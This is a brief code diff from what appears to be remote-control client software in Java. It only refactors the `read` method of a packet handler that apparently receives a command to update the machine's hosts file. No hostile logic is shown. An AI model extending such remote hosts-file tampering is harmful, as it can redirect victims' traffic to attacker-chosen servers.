@@ -11,7 +11,7 @@ import com.redpois0n.oslib.OperatingSystem;
 public class Packet56UpdateHostsFile extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String str = Connection.instance.readLine();
 
 		File file = null;
